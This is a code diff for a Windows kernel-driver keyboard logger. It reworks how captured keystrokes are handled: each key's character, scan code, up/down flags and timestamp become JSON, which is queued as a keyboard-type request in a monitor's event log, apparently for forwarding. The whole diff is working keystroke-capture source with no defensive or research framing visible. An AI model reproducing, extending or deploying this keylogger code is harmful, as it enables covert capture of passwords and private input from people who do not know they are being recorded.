@@ -1,11 +1,13 @@
 #include <inc/keybrd.h>
 #include <inc/klogger.h>
 #include <inc/monitor.h>
+#include <inc/json.h>
+#include <inc/time.h>
 
 #include <Ntstrsafe.h>
 #include <ntddkbd.h>
 #define __SUBCOMPONENT__ "keybrd"
-
+#define MODULE_TAG 'kbdm'
 #define KBD_BUFF_TAG 'kbds'
 #define FMT_BUFF_TAG 'kbdp'
 
@@ -41,8 +43,6 @@ PSTRING
 }
 
 
-
-
 VOID KbdDeref(PKBD_CONTEXT Kbd)
 {
     if (0 == InterlockedDecrement(&Kbd->RefCount)) {
@@ -64,162 +64,154 @@ BOOLEAN KbdRef(PKBD_CONTEXT Kbd)
     return TRUE;
 }
 
-VOID 
-    KbdBuffInit(PKBD_BUFF_ENTRY Entry, PVOID Bytes, ULONG BytesCount)
+NTSTATUS
+	KbdKeyToJson(
+		PKBD_KEY Key,
+		char **pJson
+	)
 {
-    Entry->Bytes = Bytes;
-    Entry->BytesCount = BytesCount;
-    Entry->BytesUsed = 0;
+	JSON_MAP map;
+	NTSTATUS Status;
+	char *sysTime = NULL;
+	LONG Key_Up = 0;
+	LONG Key_E0 = 0;
+	LONG Key_E1 = 0;
+	char *json = NULL;
+
+	if (JsonMapInit(&map))
+		return STATUS_NO_MEMORY;
+
+	sysTime = TimepQuerySystemTime(&Key->TimeFields);
+	if (sysTime == NULL) {
+		Status = STATUS_NO_MEMORY;
+		goto cleanup;
+	}
+
+	if (JsonMapSetString(&map, "buffer", Key->Str->Buffer)) {
+		Status = STATUS_NO_MEMORY;
+		goto cleanup;
+	}
+	
+	if (JsonMapSetLong(&map, "makeCode", Key->MakeCode)) {
+		Status = STATUS_NO_MEMORY;
+		goto cleanup;
+	}
+
+	if (JsonMapSetLong(&map, "flags", Key->Flags)) {
+		Status = STATUS_NO_MEMORY;
+		goto cleanup;
+	}
+
+	if (JsonMapSetString(&map, "sysTime", sysTime)) {
+		Status = STATUS_NO_MEMORY;
+		goto cleanup;
+	}
+	
+	if (Key->Flags & KEY_BREAK)
+		Key_Up = 1;
+
+	if (Key->Flags & KEY_E0)
+		Key_E0 = 1;
+
+	if (Key->Flags & KEY_E1)
+		Key_E1 = 1;
+
+
+	if (JsonMapSetLong(&map, "keyUp", Key_Up)) {
+		Status = STATUS_NO_MEMORY;
+		goto cleanup;
+	}
+
+	if (JsonMapSetLong(&map, "keyE0", Key_E0)) {
+		Status = STATUS_NO_MEMORY;
+		goto cleanup;
+	}
+
+	if (JsonMapSetLong(&map, "keyE1", Key_E1)) {
+		Status = STATUS_NO_MEMORY;
+		goto cleanup;
+	}
+
+	json = JsonMapDumps(&map);
+	if (json == NULL) {
+		Status = STATUS_NO_MEMORY;
+		goto cleanup;
+	}
+	
+	*pJson = json;
+	Status = STATUS_SUCCESS;
+
+cleanup:
+	JsonMapRelease(&map);
+
+	if (sysTime != NULL)
+		ExFreePool(sysTime);
+
+	return Status;
 }
 
-VOID
-    KbdBuffDelete(PKBD_BUFF_ENTRY Entry)
-{
-    ExFreePoolWithTag(Entry, KBD_BUFF_TAG);
-}
-
-PKBD_BUFF_ENTRY
-    KbdBuffCreate(ULONG BytesCount)
-{
-    PKBD_BUFF_ENTRY BuffEntry = NULL;
-    
-    BuffEntry = (PKBD_BUFF_ENTRY)ExAllocatePoolWithTag(NonPagedPool, sizeof(KBD_BUFF_ENTRY) + BytesCount, KBD_BUFF_TAG);
-    if (BuffEntry == NULL) {
-        __debugbreak();
-        return NULL;
-    }
-
-    KbdBuffInit(BuffEntry, (PVOID)((ULONG_PTR)BuffEntry + sizeof(KBD_BUFF_ENTRY)), BytesCount);
-    return BuffEntry;
-}
-
-PKBD_BUFF_ENTRY
-	KbdBuffGet(PKBD_CONTEXT Kbd, BOOLEAN bWait)
-{
-    PVOID pBytes = NULL;
-    PKBD_BUFF_ENTRY BuffEntry = NULL;
-    
-    if (!KbdRef(Kbd))
-        return NULL;
-
-    if (bWait)
-        KeWaitForSingleObject(&Kbd->BuffEntryEvent, Executive, KernelMode, FALSE, NULL);
-
-    KeAcquireGuardedMutex(&Kbd->BuffEntryLock);
-    if (!IsListEmpty(&Kbd->BuffEntryList)) {
-        PLIST_ENTRY ListEntry;
-        ListEntry = RemoveHeadList(&Kbd->BuffEntryList);
-        BuffEntry = CONTAINING_RECORD(ListEntry, KBD_BUFF_ENTRY, ListEntry);
-    } else {
-        BuffEntry = NULL;
-    }
-
-    KeReleaseGuardedMutex(&Kbd->BuffEntryLock);
-
-    KbdDeref(Kbd);
-    return BuffEntry;
-}
-
-VOID
-    KbdBuffSaveBuffer(PKBD_CONTEXT Kbd, PVOID Buffer, ULONG Length)
-{
-    PKBD_BUFF_ENTRY BuffEntry = NULL;
-    ULONG BytesRequired = (Length > KBD_BUFF_BYTES_COUNT) ? Length : KBD_BUFF_BYTES_COUNT;
-
-    KeAcquireGuardedMutex(&Kbd->BuffEntryLock);
-    if (IsListEmpty(&Kbd->BuffEntryList)) {
-        BuffEntry = KbdBuffCreate(BytesRequired);
-    } else {
-        PLIST_ENTRY ListEntry;
-        ListEntry = RemoveTailList(&Kbd->BuffEntryList);
-        BuffEntry = CONTAINING_RECORD(ListEntry, KBD_BUFF_ENTRY, ListEntry);
-        if (Length > (BuffEntry->BytesCount - BuffEntry->BytesUsed)) {
-            InsertTailList(&Kbd->BuffEntryList, &BuffEntry->ListEntry);
-            BuffEntry = KbdBuffCreate(BytesRequired);
-        }
-    }
-
-    if (BuffEntry != NULL) {
-        RtlCopyMemory((PVOID)((ULONG_PTR)BuffEntry->Bytes + BuffEntry->BytesUsed), Buffer, Length);
-        BuffEntry->BytesUsed+= Length;
-        InsertTailList(&Kbd->BuffEntryList, &BuffEntry->ListEntry);
-        KeSetEvent(&Kbd->BuffEntryEvent, 2, FALSE);
-    }
-
-    KeReleaseGuardedMutex(&Kbd->BuffEntryLock);
-    return;
-}
+#define KEY_ID_S_CHARS 0x10
 
 NTSTATUS
-    KbdKeyToBuff(PKBD_KEY Key, LPTSTR Buff, ULONG Length, ULONG *pRemains)
+	KbdBufToJson(PKBD_CONTEXT Kbd, PKBD_BUF Buff, char **ppJson)
 {
-	size_t Remains = (size_t)Length;
-    NTSTATUS Status;
-    
-    Status = RtlStringCchPrintfExA(Buff, Remains, &Buff, &Remains, 0, "KEY=%s;%x;%x;", Key->Str->Buffer, Key->MakeCode, Key->Flags);
-    if (!NT_SUCCESS(Status)) {
-        KLog(LError, "RtlStringCchPrintfExA err %x", Status);
-        goto cleanup;
-    }
+	JSON_MAP map;
+	BOOLEAN mapInited = FALSE;
+	ULONG Index = 0;
+	NTSTATUS Status;
+	char *keyJson = NULL, *keyIdEnd = NULL;
+	char keyId[KEY_ID_S_CHARS];
+	size_t remains = KEY_ID_S_CHARS;
+	char *pJson = NULL;
 
-    Status = RtlStringCchPrintfExA(Buff, Remains, &Buff, &Remains, 0, "%02d:%02d:%02d.%03d;",
-        Key->TimeFields.Hour, Key->TimeFields.Minute, Key->TimeFields.Second, Key->TimeFields.Milliseconds);
-    if (!NT_SUCCESS(Status)) {
-        KLog(LError, "RtlStringCchPrintfExA err %x", Status);
-        goto cleanup;
-    }
+	if (!KbdRef(Kbd)) {
+		return STATUS_TOO_LATE;
+	}
 
-    if (Key->Flags & KEY_BREAK) {
-        Status = RtlStringCchPrintfExA(Buff, Remains, &Buff, &Remains, 0, "%s;", "up");
-        if (!NT_SUCCESS(Status)) {
-            KLog(LError, "RtlStringCchPrintfExA err %x", Status);
-            goto cleanup;
-        }
-    } else {
-        Status = RtlStringCchPrintfExA(Buff, Remains, &Buff, &Remains, 0, "%s;", "down");   
-        if (!NT_SUCCESS(Status)) {
-            KLog(LError, "RtlStringCchPrintfExA err %x", Status);
-            goto cleanup;
-        }
-    }
-    
-    if (Key->Flags & KEY_E0) {
-        Status = RtlStringCchPrintfExA(Buff, Remains, &Buff, &Remains, 0, "%s;", "E0");    
-        if (!NT_SUCCESS(Status)) {
-            KLog(LError, "RtlStringCchPrintfExA err %x", Status);
-            goto cleanup;
-        }
-    }
-    
-    if (Key->Flags & KEY_E1) {
-        Status = RtlStringCchPrintfExA(Buff, Remains, &Buff, &Remains, 0, "%s;", "E1"); 
-        if (!NT_SUCCESS(Status)) {
-            KLog(LError, "RtlStringCchPrintfExA err %x", Status);
-            goto cleanup;
-        }        
-    }
-    Status = STATUS_SUCCESS;
+	if (JsonMapInit(&map)) {
+		Status = STATUS_NO_MEMORY;
+		goto cleanup;
+	}
+
+	mapInited = TRUE;
+
+	for (Index = 0; Index < Buff->Length; Index++) {
+		remains = KEY_ID_S_CHARS;
+		Status = RtlStringCchPrintfExA(keyId, remains, &keyIdEnd, &remains, 0, "%u", Index);
+		if (!NT_SUCCESS(Status)) {
+			KLog(LError, "RtlStringCchPrintfExA failed with err=%x", Status);
+			continue;
+		}
+
+		keyId[KEY_ID_S_CHARS - 1] = '\0';
+		Status = KbdKeyToJson(&Buff->Keys[Index], &keyJson);
+		if (NT_SUCCESS(Status)) {
+			if (JsonMapSetString(&map, keyId, keyJson)) {
+				KLog(LError, "JsonMapSetString failed for key=%s, value=%s", keyId, keyJson);
+			}
+			ExFreePool(keyJson);
+		} else {
+			KLog(LError, "KbdKeyToJson failed with err=%x", Status);
+		}
+	}
+
+	pJson = JsonMapDumps(&map);
+	if (pJson != NULL) {
+		*ppJson = pJson;
+		Status = STATUS_SUCCESS;
+	} else {
+		KLog(LError, "JsonMapDumps failed");
+		Status = STATUS_NO_MEMORY;
+	}
+
 cleanup:
-    *pRemains = (ULONG)Remains;
-    return Status;
+	if (mapInited)
+		JsonMapRelease(&map);
+
+	KbdDeref(Kbd);
+	return Status;
 }
 
-VOID
-    KbdSaveKbdBufContent(PKBD_CONTEXT Kbd, PKBD_BUF Buf)
-{
-    ULONG i;
-    KIRQL Irql;
-    ULONG Remains;
-    NTSTATUS Status;
-
-    for (i = 0; i < Buf->Length; i++) {
-        Kbd->FmtPage[PAGE_SIZE-1] = 0;
-        Status = KbdKeyToBuff(&Buf->Keys[i], Kbd->FmtPage, PAGE_SIZE, &Remains);
-        if (NT_SUCCESS(Status)) {
-            KbdBuffSaveBuffer(Kbd, Kbd->FmtPage, PAGE_SIZE - Remains);
-        }
-    }
-}
 
 PKBD_BUF KbdAllocBuffer(PKBD_CONTEXT Kbd)
 {
@@ -272,9 +264,8 @@ VOID KbdThreadRoutine(PVOID Context)
     LIST_ENTRY FlushQueue;
     PKBD_BUF Buff;
     PLIST_ENTRY ListEntry;
-    ULONG cBufs;
-	PKBD_BUFF_ENTRY BufEntry = NULL;
-
+	char *BufJson = NULL;
+	
     KLog(LInfo, "Kbd thread started %p\n", PsGetCurrentThread());
 
     while (TRUE) {
@@ -284,8 +275,6 @@ VOID KbdThreadRoutine(PVOID Context)
         }
 
         InitializeListHead(&FlushQueue);
-		cBufs = 0;
-
         KeAcquireSpinLock(&Kbd->Lock, &Irql);
         while (!IsListEmpty(&Kbd->FlushQueue)) {
             ListEntry = RemoveHeadList(&Kbd->FlushQueue);
@@ -297,14 +286,31 @@ VOID KbdThreadRoutine(PVOID Context)
             ListEntry = RemoveHeadList(&FlushQueue);
             Buff = CONTAINING_RECORD(ListEntry, KBD_BUF, ListEntry);
             
-            KbdSaveKbdBufContent(Kbd, Buff);
-			cBufs++;
+			Status = KbdBufToJson(Kbd, Buff, &BufJson);
+			if (!NT_SUCCESS(Status)) {
+				KLog(LError, "KbdBufToJson failed err=%x", Status);
+				goto next_step;
+			}
+
+			PSREQUEST request = SRequestCreate(SREQ_TYPE_KEYBRD);
+			if (request == NULL) {
+				KLog(LError, "SRequestCreate failed");
+				ExFreePool(BufJson);
+				goto next_step;
+			}
+
+			request->data = BufJson;
+			request->dataSz = strlen(BufJson);
+			Status = EventLogAdd(&MonitorGetInstance()->EventLog, request);
+			if (!NT_SUCCESS(Status)) {
+				KLog(LError, "EventLogAdd failed err=%x", Status);
+				SRequestDelete(request);
+				goto next_step;
+			}
+
+next_step:
             KbdFreeBuffer(Kbd, Buff);
         }
-
-		while ((!Kbd->ThreadStop) && (cBufs > 0) && ((BufEntry = KbdBuffGet(Kbd, FALSE)) != NULL)) {
-			MonitorSendKbdBuf(MonitorGetInstance(), BufEntry);
-		}
 
         if (Kbd->ThreadStop)
             break;
@@ -557,12 +563,9 @@ VOID
 
 	InitializeListHead(&Kbd->FreeList);
 	InitializeListHead(&Kbd->FlushQueue);
-	InitializeListHead(&Kbd->BuffEntryList);
 
-	KeInitializeGuardedMutex(&Kbd->BuffEntryLock);
 	KeInitializeSpinLock(&Kbd->Lock);
 	KeInitializeEvent(&Kbd->FlushEvent, SynchronizationEvent, FALSE);
-	KeInitializeEvent(&Kbd->BuffEntryEvent, SynchronizationEvent, FALSE);
 
 	KeAcquireSpinLock(&Kbd->Lock, &Irql);
 	for (Index = 0; Index < KBD_BUF_COUNT; Index++)
@@ -580,12 +583,6 @@ NTSTATUS
 	KLog(LInfo, "started");
 
 	KbdRef(Kbd);
-	Kbd->FmtPage = (PCHAR)ExAllocatePoolWithTag(NonPagedPool, PAGE_SIZE, FMT_BUFF_TAG);
-	if (Kbd->FmtPage == NULL) {
-		Status = STATUS_INSUFFICIENT_RESOURCES;
-		goto start_failed;
-	}
-
 	Status = KbdThreadStart(Kbd);
 	if (!NT_SUCCESS(Status)) {
 		goto start_failed;
@@ -611,7 +608,7 @@ VOID
 {
 	PLIST_ENTRY ListEntry;
 	KIRQL Irql;
-	PKBD_BUFF_ENTRY BuffEntry;
+	PKBD_BUF_JSON Entry;
 	ULONG Index;
 
 	KLog(LInfo, "started");
@@ -626,20 +623,6 @@ VOID
 	}
 
 	KbdThreadStop(Kbd);
-
-	KeAcquireGuardedMutex(&Kbd->BuffEntryLock);
-	while (!IsListEmpty(&Kbd->BuffEntryList)) {
-		ListEntry = RemoveHeadList(&Kbd->BuffEntryList);
-		BuffEntry = CONTAINING_RECORD(ListEntry, KBD_BUFF_ENTRY, ListEntry);
-		KbdBuffDelete(BuffEntry);
-	}
-	KeReleaseGuardedMutex(&Kbd->BuffEntryLock);
-
-	if (Kbd->FmtPage != NULL) {
-		ExFreePoolWithTag(Kbd->FmtPage, FMT_BUFF_TAG);
-		Kbd->FmtPage = NULL;
-	}
-
 	if (Kbd->HookDeviceObject != NULL) {
 		PDEVICE_OBJECT DeviceObject = Kbd->HookDeviceObject;
 		Kbd->HookDeviceObject = NULL;
@@ -649,11 +632,9 @@ VOID
 
 	KeResetEvent(&Kbd->ShutdownEvent);
 	KeResetEvent(&Kbd->FlushEvent);
-	KeResetEvent(&Kbd->BuffEntryEvent);
 
 	InitializeListHead(&Kbd->FreeList);
 	InitializeListHead(&Kbd->FlushQueue);
-	InitializeListHead(&Kbd->BuffEntryList);
 
 	KeAcquireSpinLock(&Kbd->Lock, &Irql);
 	for (Index = 0; Index < KBD_BUF_COUNT; Index++)
